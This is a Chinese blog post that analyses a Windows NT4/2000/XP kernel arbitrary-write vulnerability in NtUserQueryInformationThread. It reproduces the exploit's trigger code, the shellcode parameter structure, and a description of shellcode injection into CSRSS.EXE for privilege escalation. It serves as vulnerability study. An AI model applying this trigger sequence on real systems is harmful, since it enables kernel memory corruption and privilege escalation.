
# 浅析 Mj 前辈的内核任意地址写入漏洞

> 原文：[`www.pediy.com/kssd/pediy10/85008.html`](https://www.pediy.com/kssd/pediy10/85008.html)

write By [`hi.baidu.com/weolar/blog/item...3461064de.html`](http://hi.baidu.com/weolar/blog/item/55f9bda137a93883461064de.html)

昨天 MJ 前辈爆出了一个 Windows NT4/2000/XP（全补丁）内核任意地址写入漏洞。

还好没加花加壳~![](img/022c916b9660e467a8663bd57a4ae6d1.jpg "狂笑")

拿到 Dmeo 后今天早上赶快 IDA 了一把。遂稍微搞清楚怎么回事了。

进入 `sub_401700` 后，先得到 `CSRSS.EXE` 进程句柄，然后是一段比较中规中矩的 ShellCode 注入 `CSRSS.EXE` 提权代码。进入 `CSRSS.EXE` 后，取得附在 ShellCode 后面保存的参数（即写入的地址和写入内容）引

引起内核任意地址写入漏洞的是 `NtUserQueryInformationThread` 与 `NtUserSetInformationThread` 两个函数（确切的说是 `NtQueryInformationThread`）。

## NtQueryInformationThread 代码

```
NTSTATUS QueryInformationThread(
    IN HANDLE hThread,
    IN USERTHREADINFOCLASS ThreadInfoClass,
    OUT PVOID ThreadInformation,
    IN ULONG ThreadInformationLength,
    OUT PULONG ReturnLength OPTIONAL)
{
……
        case UserThreadFlags:
            LocalReturnLength = sizeof(DWORD);
            if (pti == NULL)
                Status = STATUS_INVALID_HANDLE;
            else if (ThreadInformationLength != sizeof(DWORD))
                Status = STATUS_INFO_LENGTH_MISMATCH;
            else
                *(LPDWORD)ThreadInformation = pti->TIF_flags;
                break;
```

导致漏洞的地方是 `*(LPDWORD)ThreadInformation = pti->TIF_flags;`

这句。由于 `ThreadInformation` 未做参数检测，而且 `pti->TIF_flags;` 又是可以被控制的，

所以漏洞被触发！

## 漏洞触发语句

```
USERTHREAD_FLAGS Flags;
Flags.FlagsMask = (DWORD)-1;
Flags.NewFlags = pValue;
if (NtOpenThread(&ThreadHandle, 96, &ObjectAttributes, &ClientId) >= 0)
{
    if (NtUserQueryInformationThread(ThreadHandle, UserThreadFlags, &pTIF_flags, 4, &pReturnLength) >= 0)
// 保存原 TIF_flags
    {
      if (NtUserSetInformationThread(ThreadHandle, UserThreadFlags, & Flags, 8) >= 0)        // 修改 TIF_flags 为我们构造的值
      {
        if (NtUserQueryInformationThread(ThreadHandle, UserThreadFlags, MyAddress, 4, & pReturnLength) >= 0)  //触发漏洞
        {
          Flags . NewFlags = pTIF_flags;        // 恢复原值
          NtUserSetInformationThread(ThreadHandle, UserThreadFlags, & Flags, 8);
           MyPShellcodeParameter ->dwIsSuc = 1; // 恢复原值
        }
      }
    }
}
```

其中传入的参数是个结构体：

```
typedef _ShellcodeParameter
{
    PVOID pMyAddress;//写入的地址
    PVOID pValue;         //写入的值
    DWORD dwIsSuc;    //是否写入成功
    DWORD dwCurrentThreadId;//线程 Id
}ShellcodeParameter,*PShellcodeParameter;
```

解析这段代码，得知先通过 `NtUserQueryInformationThread` 得到 `pTIF_flags` 的值保存，然后 `NtUseSetInformationThread` 修改 `pTIF_flags` 的值为我们需要的值，随后再用 `Query` 将 `pTIF_flags` 写入到我们精心构造的地址中。最后再讲原 `TIF_flags` 值写回，这样便完成内核任意地址写入！

通过这个漏洞，看出 Mj 前辈果然很细心很强大啊~~这么隐蔽的地方都发现。看来 WINDOWS 中还有不少可以挖掘的地方哇，哈哈。学习学习。

**PS：由于完全是静态分析，不知道有没有写错的地方……请 Mj 前辈轻点拍砖![](img/c72cb8eba397ac67dda6e1ac58a9b627.jpg "微笑")**
